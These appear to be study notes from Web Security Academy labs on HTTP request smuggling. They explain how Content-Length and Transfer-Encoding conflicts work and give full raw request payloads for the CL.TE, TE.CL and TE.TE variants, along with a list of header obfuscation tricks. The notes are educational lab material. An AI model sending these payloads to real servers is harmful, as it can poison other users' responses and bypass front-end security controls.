HTTP/1 specification provides two different ways to specify where a request ends: 
Content-Length header / Transfer-Encoding header

POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

Message body contains one or more chunks of data
Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents
The message is terminated with a chunk of size zero
You need to include the trailing sequence \r\n\r\n following the final 0

if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored

Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks

CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header
TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header
TE.TE: the front-end and back-end servers both use the Transfer-Encoding header, but one of them can be induced not to process it by obfuscating the header in some way

CL.TE vulnerability
POST / HTTP/1.1
Host: www.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

The second response should say: Unrecognized method GPOST

TE.CL vulnerability
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

You need to include the trailing sequence \r\n\r\n following the final 0
The second response should say: Unrecognized method GPOST

TE.TE behavior: obfuscating the TE header
Example:
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

only one of the front-end or back-end servers processes it, while the other server ignores it

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

You need to include the trailing sequence \r\n\r\n following the final 0
The second response should say: Unrecognized method GPOST
